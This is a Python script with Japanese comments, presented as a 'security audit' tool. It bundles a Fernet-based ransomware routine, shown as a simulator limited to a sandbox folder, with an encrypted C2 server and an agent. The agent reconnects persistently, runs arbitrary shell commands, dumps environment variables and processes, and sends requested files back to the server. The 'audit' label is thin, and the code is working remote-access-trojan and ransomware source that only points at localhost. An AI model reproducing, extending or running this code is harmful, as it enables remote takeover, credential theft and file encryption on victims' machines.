import os
import sys
import time
import socket
import subprocess
import platform
import json
import base64
from cryptography.fernet import Fernet

# ==========================================
# 🛠️ Mac (libedit) 向け矢印キー（履歴）対策
# ==========================================
try:
    import readline
    if 'libedit' in getattr(readline, '__doc__', ''):
        readline.parse_and_bind("bind ^[[A history-search-backward")
        readline.parse_and_bind("bind ^[[B history-search-forward")
    else:
        readline.parse_and_bind("tab: complete")
except Exception:
    pass

# ==========================================
# 設定とカラー定義
# ==========================================
SANDBOX_DIR = "./sandbox"
KEY_FILE = "secret.key"

class Colors:
    OKGREEN = '\033[92m'  # 成功（緑）
    WARNING = '\033[93m'  # 警告・注意（黄色）
    FAIL = '\033[91m'     # エラー・重要（赤）
    ENDC = '\033[0m'      # リセット
    BOLD = '\033[1m'

def load_or_create_key():
    """暗号化用の鍵を生成または読み込む"""
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as f:
            return f.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as f:
            f.write(key)
        return key

def create_test_file():
    if not os.path.exists(SANDBOX_DIR):
        os.makedirs(SANDBOX_DIR)
    file_path = os.path.join(SANDBOX_DIR, "secret.txt")
    if not os.path.exists(file_path):
        with open(file_path, "w", encoding="utf-8") as f:
            f.write("これは企業の機密データベース、および重要財務ファイルを含む機密データです。")

# ==========================================
# 1. 監査・ファイル管理・ランサムウェア機能
# ==========================================
def lock_files():
    create_test_file()
    key = load_or_create_key()
    fernet = Fernet(key)
    
    print(f"\n{Colors.WARNING}[!] 強力な暗号化によるファイルロックを開始します...{Colors.ENDC}")
    count = 0
    for root, dirs, files in os.walk(SANDBOX_DIR):
        for file in files:
            if file.endswith(".locked") or file == "README_DECRYPT.txt" or file == KEY_FILE:
                continue
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as f:
                content = f.read()
            encrypted_content = fernet.encrypt(content)
            with open(file_path + ".locked", "wb") as f:
                f.write(encrypted_content)
            os.remove(file_path)
            count += 1
    print(f"{Colors.OKGREEN}[+] {count} 個のファイルを暗号化しました。{Colors.ENDC}")

def unlock_files(user_key: bytes):
    try:
        fernet = Fernet(user_key)
    except Exception:
        print(f"{Colors.FAIL}[-] 無効な鍵の形式です。{Colors.ENDC}")
        return

    restored = 0
    for root, dirs, files in os.walk(SANDBOX_DIR):
        for file in files:
            if file.endswith(".locked"):
                path = os.path.join(root, file)
                with open(path, "rb") as f:
                    decrypted = fernet.decrypt(f.read())
                with open(path[:-8], "wb") as f:
                    f.write(decrypted)
                os.remove(path)
                restored += 1
    print(f"{Colors.OKGREEN}[+] 復元完了！ {restored} 個のファイルが元に戻りました。{Colors.ENDC}")

def menu_locker():
    while True:
        print(f"\n{Colors.BOLD}--- [モード1] ランサムウェア・シミュレーター ---{Colors.ENDC}")
        print("1. ファイルを暗号化する")
        print("2. 鍵を入力して復元する")
        print("3. メインメニューに戻る")
        choice = input("選択 (1/2/3): ")
        if choice == "1":
            lock_files()
        elif choice == "2":
            key_in = input("復号キーを入力: ").strip().encode()
            unlock_files(key_in)
        elif choice == "3":
            break

def audit_system_environment():
    is_root = (os.getuid() == 0) if hasattr(os, "getuid") else False
    info = {
        "system": platform.system(),
        "release": platform.release(),
        "node": platform.node(),
        "current_user": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
        "is_elevated_root": is_root,
        "working_directory": os.getcwd()
    }
    return json.dumps(info, ensure_ascii=False, indent=2)

def get_process_list():
    try:
        res = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=5)
        return res.stdout
    except Exception as e:
        return f"Process listing failed: {str(e)}"

def collect_auto_logs():
    logs = {}
    try:
        logs["disk"] = subprocess.run(["df", "-h"], capture_output=True, text=True, timeout=5).stdout
        logs["network"] = subprocess.run(["netstat", "-an"], capture_output=True, text=True, timeout=5).stdout
        logs["env"] = dict(os.environ)
        return json.dumps(logs, ensure_ascii=False, indent=2)
    except Exception as e:
        return f"Log collection failed: {str(e)}"

# ==========================================
# 2. C2サーバー機能（拡張コマンド対応）
# ==========================================
def run_c2_server():
    HOST = '127.0.0.1'
    PORT = 4444
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    
    print(f"\n{Colors.WARNING}[*] 監査C2サーバー起動中... 接続待ち ({HOST}:{PORT}){Colors.ENDC}")
    conn, addr = server_socket.accept()
    conn.settimeout(45.0) # 余裕を持ったタイムアウト設定
    print(f"{Colors.OKGREEN}[+] ターゲット端末から接続確立: {addr}{Colors.ENDC}")
    
    c2_key = load_or_create_key()
    fernet = Fernet(c2_key)
    
    # 🔗 接続直後の自動初期スキャン
    try:
        print(f"{Colors.OKGREEN}[*] ターゲットの環境自動監査を実行中...{Colors.ENDC}")
        conn.send(fernet.encrypt("AUDIT_SYS".encode('utf-8')))
        res_sys = fernet.decrypt(conn.recv(16384)).decode('utf-8', errors='ignore')
        
        print(f"\n{Colors.BOLD}--- 【自動監査】システム・権限情報 ---{Colors.ENDC}")
        print(res_sys)
        print(f"{Colors.BOLD}--------------------------------------{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}[-] 初期監査スキャンに失敗しました: {e}{Colors.ENDC}")

    try:
        while True:
            command = input(f"{Colors.BOLD}Audit_C2_Shell> {Colors.ENDC}")
            if not command.strip():
                continue
            if command.lower() == 'exit':
                conn.send(fernet.encrypt(command.encode('utf-8')))
                break
            
            # コマンドの送信
            conn.send(fernet.encrypt(command.encode('utf-8')))
            
            # 長大なプロセス一覧やファイルデータを受信できるよう大きめのバッファ (2MB) を確保
            encrypted_response = conn.recv(1024 * 1024 * 2)
            if not encrypted_response:
                print(f"{Colors.FAIL}[-] ターゲットとの接続が切断されました。{Colors.ENDC}")
                break
            
            response = fernet.decrypt(encrypted_response).decode('utf-8', errors='ignore')
            
            # 各種特殊レスポンスのハンドリング
            if response.startswith("FILE_DATA:"):
                _, filename, encoded_data = response.split(":", 2)
                try:
                    file_bytes = base64.b64decode(encoded_data.encode('utf-8'))
                    save_path = f"./downloaded_{filename}"
                    with open(save_path, "wb") as f:
                        f.write(file_bytes)
                    print(f"{Colors.OKGREEN}[+] ファイルを正常にダウンロードして保存しました: {save_path} ({len(file_bytes)} bytes){Colors.ENDC}")
                except Exception as e:
                    print(f"{Colors.FAIL}[-] ファイル保存エラー: {e}{Colors.ENDC}")
            elif response.startswith("ENCRYPTED_RESULT:"):
                _, filename, encoded_data = response.split(":", 2)
                try:
                    cipher_bytes = base64.b64decode(encoded_data.encode('utf-8'))
                    save_path = f"./encrypted_{filename}.enc"
                    with open(save_path, "wb") as f:
                        f.write(cipher_bytes)
                    print(f"{Colors.OKGREEN}[+] 暗号化ファイルを受信・保存しました: {save_path}{Colors.ENDC}")
                except Exception as e:
                    print(f"{Colors.FAIL}[-] 暗号化ファイル保存エラー: {e}{Colors.ENDC}")
            else:
                print(response)
            
    except socket.timeout:
        print(f"{Colors.FAIL}[-] タイムアウト: ハートビートが途絶えました。{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}[-] エラー発生: {e}{Colors.ENDC}")
    finally:
        conn.close()
        server_socket.close()
        print(f"{Colors.WARNING}[*] サーバーを終了しました。{Colors.ENDC}")

# ==========================================
# 3. エージェント機能
# ==========================================
def run_agent():
    C2_HOST = '127.0.0.1'
    C2_PORT = 4444
    print(f"\n{Colors.WARNING}[*] 監視サーバー ({C2_HOST}:{C2_PORT}) へ自動再接続ループを開始します...{Colors.ENDC}")
    
    c2_key = load_or_create_key()
    fernet = Fernet(c2_key)
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_HOST, C2_PORT))
            s.settimeout(45.0)
            print(f"{Colors.OKGREEN}[+] サーバー接続成功。命令を待受中...{Colors.ENDC}")
            
            while True:
                encrypted_command = s.recv(4096)
                if not encrypted_command:
                    break
                
                try:
                    command = fernet.decrypt(encrypted_command).decode('utf-8')
                except Exception:
                    break
                
                if command.lower() == 'exit':
                    break
                
                # コマンドの解析と処理分岐
                if command == "AUDIT_SYS":
                    output = audit_system_environment()
                elif command == "procs" or command == "GET_PROCS":
                    output = get_process_list()
                elif command == "AUTO_LOGS":
                    output = collect_auto_logs()
                elif command.startswith("DOWNLOAD:"):
                    target_path = command.split(":", 1)[1].strip()
                    if os.path.exists(target_path) and os.path.isfile(target_path):
                        try:
                            with open(target_path, "rb") as f:
                                file_bytes = f.read()
                            encoded = base64.b64encode(file_bytes).decode('utf-8')
                            output = f"FILE_DATA:{os.path.basename(target_path)}:{encoded}"
                        except Exception as e:
                            output = f"[-] ファイル読込エラー: {str(e)}"
                    else:
                        output = "[-] 指定されたファイルが見つかりません。"
                elif command.startswith("ENCRYPT_FILE:"):
                    target_path = command.split(":", 1)[1].strip()
                    if os.path.exists(target_path) and os.path.isfile(target_path):
                        try:
                            with open(target_path, "rb") as f:
                                plain_data = f.read()
                            cipher_data = fernet.encrypt(plain_data)
                            encoded = base64.b64encode(cipher_data).decode('utf-8')
                            output = f"ENCRYPTED_RESULT:{os.path.basename(target_path)}:{encoded}"
                        except Exception as e:
                            output = f"[-] 暗号化処理エラー: {str(e)}"
                    else:
                        output = "[-] 指定されたファイルが見つかりません。"
                else:
                    try:
                        output = subprocess.check_output(
                            command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10
                        )
                    except Exception as e:
                        output = f"Execution Failed: {str(e)}\n"
                
                encrypted_output = fernet.encrypt(output.encode('utf-8'))
                s.send(encrypted_output)
                
        except (socket.error, socket.timeout):
            print(f"{Colors.FAIL}[-] 接続断またはタイムアウト。5秒後に自動再接続します...{Colors.ENDC}")
            time.sleep(5)
        except Exception:
            time.sleep(5)
        finally:
            s.close()

# ==========================================
# メインメニュー
# ==========================================
if __name__ == "__main__":
    while True:
        print(f"\n{Colors.BOLD}========================================{Colors.ENDC}")
        print(f"{Colors.OKGREEN} 🔒 セキュリティ監査・監視ツール (Pro) {Colors.ENDC}")
        print(f"{Colors.BOLD}========================================{Colors.ENDC}")
        print("1. C2監査サーバーを起動する")
        print("2. 監視エージェントを起動する")
        print("3. 終了する")
        choice = input("モードを選択してください (1-3): ")
        
        if choice == "1":
            run_c2_server()
        elif choice == "2":
            run_agent()
        elif choice == "3":
            print("終了します。お疲れ様でした！")
            sys.exit(0)
        else:
            print(f"{Colors.FAIL}[-] 1から3の番号で選択してください。{Colors.ENDC}")